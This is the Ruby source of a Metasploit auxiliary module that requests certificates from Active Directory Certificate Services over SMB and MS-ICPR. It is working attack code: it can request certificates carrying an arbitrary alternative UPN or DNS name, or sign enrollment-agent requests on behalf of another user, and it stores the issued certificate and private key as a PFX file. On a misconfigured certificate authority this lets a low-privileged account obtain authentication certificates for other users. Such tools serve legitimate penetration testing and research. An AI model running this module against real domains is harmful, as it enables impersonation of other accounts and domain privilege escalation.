##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'ruby_smb/dcerpc/client'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SMB::Client::Authenticated
  include Msf::Exploit::Remote::DCERPC
  include Msf::Auxiliary::Report

  NTDS_CA_SECURITY_EXT = '1.3.6.1.4.1.311.25.2'.freeze
  # [2.2.2.7.5 szOID_NT_PRINCIPAL_NAME](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/ea9ef420-4cbf-44bc-b093-c4175139f90f)
  OID_NT_PRINCIPAL_NAME = '1.3.6.1.4.1.311.20.2.3'.freeze
  # [[MS-WCCE]: Windows Client Certificate Enrollment Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-winerrata/c39fd72a-da21-4b13-b329-c35d61f74a60)
  OID_NTDS_OBJECTSID = '1.3.6.1.4.1.311.25.2.1'.freeze
  # [[MS-WCCE]: 2.2.2.7.10 szENROLLMENT_NAME_VALUE_PAIR](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/92f07a54-2889-45e3-afd0-94b60daa80ec)
  OID_ENROLLMENT_NAME_VALUE_PAIR = '1.3.6.1.4.1.311.13.2.1'.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'ICPR Certificate Management',
        'Description' => %q{
          Request certificates via MS-ICPR (Active Directory Certificate Services). Depending on the certificate
          template's configuration the resulting certificate can be used for various operations such as authentication.
          PFX certificate files that are saved are encrypted with a blank password.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Will Schroeder', # original idea/research
          'Lee Christensen', # original idea/research
          'Oliver Lyak', # certipy implementation
          'Spencer McIntyre'
        ],
        'References' => [
          [ 'URL', 'https://github.com/GhostPack/Certify' ],
          [ 'URL', 'https://github.com/ly4k/Certipy' ]
        ],
        'Notes' => {
          'Reliability' => [],
          'Stability' => [],
          'SideEffects' => [ IOC_IN_LOGS ],
          'AKA' => [ 'Certifry', 'Certipy' ]
        },
        'Actions' => [
          [ 'REQUEST_CERT', { 'Description' => 'Request a certificate' } ]
        ],
        'DefaultAction' => 'REQUEST_CERT'
      )
    )

    register_options([
      OptString.new('CA', [ true, 'The target certificate authority' ]),
      OptString.new('CERT_TEMPLATE', [ true, 'The certificate template', 'User' ]),
      OptString.new('ALT_DNS', [ false, 'Alternative certificate DNS' ]),
      OptString.new('ALT_UPN', [ false, 'Alternative certificate UPN (format: USER@DOMAIN)' ]),
      OptPath.new('PFX', [ false, 'Certificate to request on behalf of' ]),
      OptString.new('ON_BEHALF_OF', [ false, 'Username to request on behalf of (format: DOMAIN\\USER)' ]),
      Opt::RPORT(445)
    ])
    register_advanced_options([
      OptEnum.new('DigestAlgorithm', [ true, 'The digest algorithm to use', 'SHA256', %w[SHA1 SHA256] ])
    ])
  end

  def connect_icpr
    vprint_status('Connecting to ICertPassage (ICPR) Remote Protocol')
    icpr = @tree.open_file(filename: 'cert', write: true, read: true)

    vprint_status('Binding to \\cert...')
    icpr.bind(
      endpoint: RubySMB::Dcerpc::Icpr,
      auth_level: RubySMB::Dcerpc::RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
      auth_type: RubySMB::Dcerpc::RPC_C_AUTHN_WINNT
    )
    vprint_good('Bound to \\cert')

    icpr
  end

  def setup
    send("setup_#{action.name.downcase}")

    super
  end

  def run
    begin
      connect
    rescue Rex::ConnectionError => e
      fail_with(Failure::Unreachable, e.message)
    end

    begin
      smb_login
    rescue Rex::Proto::SMB::Exceptions::Error, RubySMB::Error::RubySMBError => e
      fail_with(Failure::NoAccess, "Unable to authenticate ([#{e.class}] #{e}).")
    end
    report_service(
      host: rhost,
      port: rport,
      host_name: simple.client.default_name,
      proto: 'tcp',
      name: 'smb',
      info: "Module: #{fullname}, last negotiated version: SMBv#{simple.client.negotiated_smb_version} (dialect = #{simple.client.dialect})"
    )

    begin
      @tree = simple.client.tree_connect("\\\\#{sock.peerhost}\\IPC$")
    rescue RubySMB::Error::RubySMBError => e
      fail_with(Failure::Unreachable, "Unable to connect to the remote IPC$ share ([#{e.class}] #{e}).")
    end

    begin
      @icpr = connect_icpr
    rescue RubySMB::Error::UnexpectedStatusCode => e
      if e.status_code == ::WindowsError::NTStatus::STATUS_OBJECT_NAME_NOT_FOUND
        # STATUS_OBJECT_NAME_NOT_FOUND will be the status if Active Directory Certificate Service (AD CS) is not installed on the target
        fail_with(Failure::NotFound, 'Connection failed (AD CS was not found)')
      end

      elog(e.message, error: e)
      fail_with(Failure::UnexpectedReply, "Connection failed (unexpected status: #{e.status_name})")
    end

    send("action_#{action.name.downcase}")
  rescue RubySMB::Dcerpc::Error::FaultError => e
    elog(e.message, error: e)
    fail_with(Failure::UnexpectedReply, "Operation failed (DCERPC fault: #{e.status_name})")
  rescue RubySMB::Dcerpc::Error::DcerpcError => e
    elog(e.message, error: e)
    fail_with(Failure::UnexpectedReply, e.message)
  rescue RubySMB::Error::RubySMBError
    elog(e.message, error: e)
    fail_with(Failure::Unknown, e.message)
  end

  def setup_request_cert
    errors = {}
    if datastore['ALT_UPN'].present? && datastore['ALT_UPN'] !~ /^\S+@[^\s\\]+$/
      errors['ALT_UPN'] = 'Must be in the format USER@DOMAIN.'
    end

    if datastore['ON_BEHALF_OF'].present?
      errors['ON_BEHALF_OF'] = 'Must be in the format DOMAIN\\USER.' unless datastore['ON_BEHALF_OF'] =~ /^[^\s@]+\\\S+$/
      errors['PFX'] = 'A PFX file is required when ON_BEHALF_OF is specified.' if datastore['PFX'].blank?
    end

    @pkcs12 = nil
    if datastore['PFX'].present?
      begin
        @pkcs12 = OpenSSL::PKCS12.new(File.binread(datastore['PFX']))
      rescue StandardError => e
        errors['PFX'] = "Failed to load the PFX file (#{e})"
      end
    end

    raise OptionValidateError, errors unless errors.empty?
  end

  def action_request_cert
    private_key = OpenSSL::PKey::RSA.new(2048)
    csr = build_csr(
      cn: datastore['SMBUser'],
      private_key: private_key,
      dns: (datastore['ALT_DNS'].blank? ? nil : datastore['ALT_DNS']),
      msext_upn: (datastore['ALT_UPN'].blank? ? nil : datastore['ALT_UPN']),
      algorithm: datastore['DigestAlgorithm']
    )

    if @pkcs12 && datastore['ON_BEHALF_OF'].present?
      vprint_status("Building certificate request on behalf of #{datastore['ON_BEHALF_OF']}")
      csr = build_on_behalf_of(
        csr: csr,
        on_behalf_of: datastore['ON_BEHALF_OF'],
        cert: @pkcs12.certificate,
        key: @pkcs12.key,
        algorithm: datastore['DigestAlgorithm']
      )
    end

    attributes = { 'CertificateTemplate' => datastore['CERT_TEMPLATE'] }
    san = []
    san << "dns=#{datastore['ALT_DNS']}" if datastore['ALT_DNS'].present?
    san << "upn=#{datastore['ALT_UPN']}" if datastore['ALT_UPN'].present?
    attributes['SAN'] = san.join('&') unless san.empty?

    print_status('Requesting a certificate...')
    response = @icpr.cert_server_request(
      attributes: attributes,
      authority: datastore['CA'],
      csr: csr
    )
    case response[:status]
    when :issued
      print_good('The requested certificate was issued.')
    when :submitted
      print_warning('The requested certificate was submitted for review.')
    else
      print_error('There was an error while requesting the certificate.')
      print_error(response[:disposition_message].strip.to_s) unless response[:disposition_message].blank?
      return
    end

    if (upn = get_cert_msext_upn(response[:certificate]))
      print_status("Certificate UPN: #{upn}")
    end

    if (sid = get_cert_msext_sid(response[:certificate]))
      print_status("Certificate SID: #{sid}")
    end

    pkcs12 = OpenSSL::PKCS12.create('', '', private_key, response[:certificate])
    # see: https://pki-tutorial.readthedocs.io/en/latest/mime.html#mime-types
    info = "#{simple.client.default_domain}\\#{datastore['SMBUser']} Certificate"
    stored_path = store_loot('windows.ad.cs', 'application/x-pkcs12', nil, pkcs12.to_der, 'certificate.pfx', info)
    print_status("Certificate stored at: #{stored_path}")
  end

  # Make a certificate signing request.
  #
  # @param [String] cn The common name for the certificate.
  # @param [OpenSSL::PKey] private_key The private key for the certificate.
  # @param [String] dns An alternative DNS name to use.
  # @param [String] msext_upn An alternative User Principal Name (this is a Microsoft-specific feature).
  # @param [String] algorithm The digest algorithm to use.
  # @return [OpenSSL::X509::Request] The request object.
  def build_csr(cn:, private_key:, dns: nil, msext_upn: nil, algorithm: 'SHA256')
    request = OpenSSL::X509::Request.new
    request.version = 1
    request.subject = OpenSSL::X509::Name.new([
      ['CN', cn, OpenSSL::ASN1::UTF8STRING]
    ])
    request.public_key = private_key.public_key

    subject_alt_names = []
    subject_alt_names << "DNS:#{dns}" if dns
    subject_alt_names << "otherName:#{OID_NT_PRINCIPAL_NAME};UTF8:#{msext_upn}" if msext_upn
    unless subject_alt_names.empty?
      extension = OpenSSL::X509::ExtensionFactory.new.create_extension('subjectAltName', subject_alt_names.join(','), false)
      request.add_attribute(OpenSSL::X509::Attribute.new(
        'extReq',
        OpenSSL::ASN1::Set.new(
          [OpenSSL::ASN1::Sequence.new([extension])]
        )
      ))
    end

    request.sign(private_key, OpenSSL::Digest.new(algorithm))
    request
  end

  # Make a certificate request on behalf of another user.
  #
  # @param [OpenSSL::X509::Request] csr The certificate request to make on behalf of the user.
  # @param [String] on_behalf_of The user to make the request on behalf of.
  # @param [OpenSSL::X509::Certificate] cert The public key to use for signing the request.
  # @param [OpenSSL::PKey::RSA] key The private key to use for signing the request.
  # @param [String] algorithm The digest algorithm to use.
  # @return [Rex::Proto::Kerberos::Model::Pkinit::ContentInfo] The signed request content.
  def build_on_behalf_of(csr:, on_behalf_of:, cert:, key:, algorithm: 'SHA256')
    # algorithm needs to be one that OpenSSL supports, but we also need the OID constants defined
    digest = OpenSSL::Digest.new(algorithm)
    unless [ digest.name, "RSAWith#{digest.name}" ].all? { |s| Rex::Proto::Kerberos::Model::OID.constants.include?(s.to_sym) }
      raise ArgumentError, "Can not map digest algorithm #{digest.name} to the necessary OIDs."
    end

    digest_oid = Rex::Proto::Kerberos::Model::OID.const_get(digest.name)

    signer_info = Rex::Proto::Kerberos::Model::Pkinit::SignerInfo.new(
      version: 1,
      sid: {
        issuer: cert.issuer,
        serial_number: cert.serial.to_i
      },
      digest_algorithm: {
        algorithm: digest_oid
      },
      signed_attrs: [
        {
          attribute_type: OID_ENROLLMENT_NAME_VALUE_PAIR,
          attribute_values: [
            RASN1::Types::Any.new(value: Rex::Proto::CryptoAsn1::EnrollmentNameValuePair.new(
              name: 'requestername',
              value: on_behalf_of
            ))
          ]
        },
        {
          attribute_type: Rex::Proto::Kerberos::Model::OID::MessageDigest,
          attribute_values: [RASN1::Types::Any.new(value: RASN1::Types::OctetString.new(value: digest.digest(csr.to_der)))]
        }
      ],
      signature_algorithm: {
        algorithm: Rex::Proto::Kerberos::Model::OID.const_get("RSAWith#{digest.name}")
      }
    )
    data = RASN1::Types::Set.new(value: signer_info[:signed_attrs].value).to_der
    signature = key.sign(digest, data)

    signer_info[:signature] = signature

    signed_data = Rex::Proto::Kerberos::Model::Pkinit::SignedData.new(
      version: 3,
      digest_algorithms: [
        {
          algorithm: digest_oid
        }
      ],
      encap_content_info: {
        econtent_type: Rex::Proto::Kerberos::Model::OID::PkinitAuthData,
        econtent: csr.to_der
      },
      certificates: [{ openssl_certificate: cert }],
      signer_infos: [signer_info]
    )

    Rex::Proto::Kerberos::Model::Pkinit::ContentInfo.new(
      content_type: Rex::Proto::Kerberos::Model::OID::SignedData,
      signed_data: signed_data
    )
  end

  # Get the object security identifier (SID) from the certificate. This is a Microsoft specific extension.
  #
  # @param [OpenSSL::X509::Certificate] cert
  # @return [String, nil] The SID if it was found, otherwise nil.
  def get_cert_msext_sid(cert)
    get_cert_ext_property(cert, NTDS_CA_SECURITY_EXT, OID_NTDS_OBJECTSID)
  end

  # Get the User Principal Name (UPN) from the certificate. This is a Microsoft specific extension.
  #
  # @param [OpenSSL::X509::Certificate] cert
  # @return [String, nil] The UPN if it was found, otherwise nil.
  def get_cert_msext_upn(cert)
    get_cert_ext_property(cert, 'subjectAltName', 'msUPN')
  end

  private

  # Get a value from a certificate extension. Returns nil if it's not found. Allows fetching values not natively
  # supported by Ruby's OpenSSL by parsing the ASN1 directly.
  def get_cert_ext_property(cert, ext_oid, key)
    ext = cert.extensions.find { |e| e.oid == ext_oid }
    return unless ext

    # need to decode the contents and handle them ourselves
    ext_asn = OpenSSL::ASN1.decode(OpenSSL::ASN1.decode(ext.to_der).value[1].value)
    ext_asn.value.each do |value|
      value = value.value
      next unless value.is_a?(Array)
      next unless value[0]&.value == key

      return value[1].value[0].value
    end

    nil
  end
end
